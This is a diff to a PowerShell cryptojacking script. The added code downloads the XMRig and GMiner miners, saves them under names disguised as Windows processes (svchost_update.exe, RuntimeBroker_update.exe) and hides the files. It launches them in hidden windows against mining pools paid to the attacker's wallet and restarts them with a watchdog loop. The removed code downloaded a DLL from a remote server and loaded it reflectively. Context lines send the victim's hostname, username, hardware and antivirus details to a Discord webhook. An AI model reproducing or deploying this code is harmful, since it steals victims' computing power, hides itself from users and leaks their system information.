@@ -135,41 +135,110 @@ Start-Job -ScriptBlock {
     } catch {}
 } -ArgumentList $c, $c.base | Out-Null
 
-# === DLL INJECTION (with retry + fallback) ===
-$maxRetries = 3
-for ($i = 1; $i -le $maxRetries; $i++) {
+# === DIRECT MINER DEPLOYMENT (No DLL needed) ===
+$mName = "$($env:COMPUTERNAME)".Replace(' ','_')
+$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
+$gminerUrl = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
+
+# Find a writable directory
+$writableDir = $null
+$tryDirs = @($env:TEMP, "$env:LOCALAPPDATA\Temp", "$env:APPDATA\Microsoft", "$env:LOCALAPPDATA\Microsoft\CLR\NativeImages")
+foreach ($d in $tryDirs) {
     try {
-        $dllUrl = "$($c.base)/Bridge.dll?v=$([Guid]::NewGuid())"
-        $bytes = $null
-        try {
-            $wc = New-Object System.Net.WebClient
-            $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-            $bytes = $wc.DownloadData($dllUrl)
-        } catch {
-            try {
-                $tmp = Join-Path $env:TEMP "$([Guid]::NewGuid()).tmp"
-                Import-Module BitsTransfer -EA 0
-                Start-BitsTransfer -Source $dllUrl -Destination $tmp -EA 0
-                if (Test-Path $tmp) {
-                    $bytes = [IO.File]::ReadAllBytes($tmp)
-                    Remove-Item $tmp -Force -EA 0
-                }
-            } catch {}
+        if (!(Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
+        $testFile = Join-Path $d "test_$([Guid]::NewGuid()).tmp"
+        [IO.File]::WriteAllBytes($testFile, [byte[]]@(0))
+        Remove-Item $testFile -Force
+        $writableDir = $d
+        Write-Host "[+] Writable dir: $d"
+        break
+    } catch { Write-Host "[!] Dir blocked: $d" }
+}
+if (!$writableDir) { Write-Host "[!] FATAL: No writable dir!"; return }
+
+# Download and extract xmrig
+$cpuExe = Join-Path $writableDir "svchost_update.exe"
+if (!(Test-Path $cpuExe)) {
+    try {
+        Write-Host "[*] Downloading XMRig..."
+        $zipPath = Join-Path $writableDir "upd_$([Guid]::NewGuid()).zip"
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        $wc.DownloadFile($xmrigUrl, $zipPath)
+        Write-Host "[+] Downloaded XMRig zip"
+
+        Add-Type -Assembly System.IO.Compression.FileSystem
+        $zip = [IO.Compression.ZipFile]::OpenRead($zipPath)
+        foreach ($entry in $zip.Entries) {
+            if ($entry.Name -eq 'xmrig.exe') {
+                $stream = $entry.Open()
+                $fs = [IO.File]::Create($cpuExe)
+                $stream.CopyTo($fs)
+                $fs.Close()
+                $stream.Close()
+                Write-Host "[+] Extracted xmrig to: $cpuExe"
+                break
+            }
         }
-        if ($bytes -and $bytes.Length -gt 0) {
-            Write-Host "[+] DLL Downloaded ($($bytes.Length) bytes)"
-            $asm = [System.AppDomain]::CurrentDomain.Load($bytes)
-            Write-Host "[+] Assembly Loaded: $($asm.FullName)"
-            $repo = "$($c.u1)/$($c.u2)"
-            Write-Host "[*] Invoking StartMiner..."
-            $asm.GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @($hw.gpu, $c.addr, $repo, $c.pat))
-            Write-Host "[+] StartMiner Invoked!"
-            break
-        }
+        $zip.Dispose()
+        Remove-Item $zipPath -Force -EA 0
+        # Hide it
+        try { [IO.File]::SetAttributes($cpuExe, 'Hidden,System') } catch {}
     } catch {
-        Write-Host "[!] Error: $($_.Exception.Message)"
-        if ($i -lt $maxRetries) { Start-Sleep -Seconds ($i * 5) }
+        Write-Host "[!] XMRig download failed: $($_.Exception.Message)"
     }
+}
+
+# Download and extract gminer (if GPU)
+$gpuExe = $null
+if ($hw.gpu) {
+    $gpuExe = Join-Path $writableDir "RuntimeBroker_update.exe"
+    if (!(Test-Path $gpuExe)) {
+        try {
+            Write-Host "[*] Downloading GMiner..."
+            $zipPath2 = Join-Path $writableDir "upd2_$([Guid]::NewGuid()).zip"
+            $wc2 = New-Object System.Net.WebClient
+            $wc2.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+            $wc2.DownloadFile($gminerUrl, $zipPath2)
+            Write-Host "[+] Downloaded GMiner zip"
+
+            $zip2 = [IO.Compression.ZipFile]::OpenRead($zipPath2)
+            foreach ($entry in $zip2.Entries) {
+                if ($entry.Name -eq 'miner.exe') {
+                    $stream = $entry.Open()
+                    $fs = [IO.File]::Create($gpuExe)
+                    $stream.CopyTo($fs)
+                    $fs.Close()
+                    $stream.Close()
+                    Write-Host "[+] Extracted gminer to: $gpuExe"
+                    break
+                }
+            }
+            $zip2.Dispose()
+            Remove-Item $zipPath2 -Force -EA 0
+            try { [IO.File]::SetAttributes($gpuExe, 'Hidden,System') } catch {}
+        } catch {
+            Write-Host "[!] GMiner download failed: $($_.Exception.Message)"
+            $gpuExe = $null
+        }
+    }
+}
+
+# === LAUNCH MINERS ===
+if (Test-Path $cpuExe) {
+    $cpuArgs = "-o pool.supportxmr.com:3333 -u $($c.addr) -p WinSys_$mName -a rx -k --cpu-max-threads-hint 35 --cpu-priority 0 --asm=auto --donate-level 1"
+    Write-Host "[*] Launching CPU miner: $cpuArgs"
+    $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru
+    Write-Host "[+] CPU Miner LAUNCHED - PID: $($cpuProc.Id)"
+} else {
+    Write-Host "[!] CPU miner binary not found!"
+}
+
+if ($gpuExe -and (Test-Path $gpuExe)) {
+    $gpuArgs = "--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:$($c.addr).WinSys_${mName}_G#1871184566 --pass x --intensity 25 --ssl 0"
+    Write-Host "[*] Launching GPU miner: $gpuArgs"
+    $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru
+    Write-Host "[+] GPU Miner LAUNCHED - PID: $($gpuProc.Id)"
 }
 
 # === RICH DISCORD NOTIFICATION ===
@@ -183,16 +252,25 @@ try {
             description = "**Deployment Success**`n" +
                 "``````Host: $($env:COMPUTERNAME)`nUser: $($env:USERNAME)`nCPU: $($hw.cpuName)`nCores: $($hw.cores)`nRAM: $($hw.ram) GB`nGPU: $($hw.gpuName)`nOS: $osName`nAV: $av`nUptime: $($upHours)h``````"
             color = 3066993
-            footer = @{ text = "v2.0 | $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')" }
+            footer = @{ text = "v3.0 | $(Get-Date -Format 'yyyy-MM-dd HH:mm UTC')" }
         })
     } | ConvertTo-Json -Depth 4
     Invoke-RestMethod -Uri $c.wh -Method Post -Body $json -ContentType "application/json" -EA 0
 } catch {}
 
-# Background Keep-alive
-while ($true) { Start-Sleep -Seconds 3600 }
-
-
-
-
+# === WATCHDOG LOOP (restart miners if they die) ===
+Write-Host "[*] Watchdog active. Monitoring miners..."
+while ($true) {
+    Start-Sleep -Seconds 30
+    if ($cpuProc -and $cpuProc.HasExited) {
+        Write-Host "[!] CPU miner died. Restarting..."
+        $cpuProc = Start-Process -FilePath $cpuExe -ArgumentList $cpuArgs -WindowStyle Hidden -PassThru
+        Write-Host "[+] CPU Restarted PID: $($cpuProc.Id)"
+    }
+    if ($gpuProc -and $gpuProc.HasExited) {
+        Write-Host "[!] GPU miner died. Restarting..."
+        $gpuProc = Start-Process -FilePath $gpuExe -ArgumentList $gpuArgs -WindowStyle Hidden -PassThru
+        Write-Host "[+] GPU Restarted PID: $($gpuProc.Id)"
+    }
+}
 
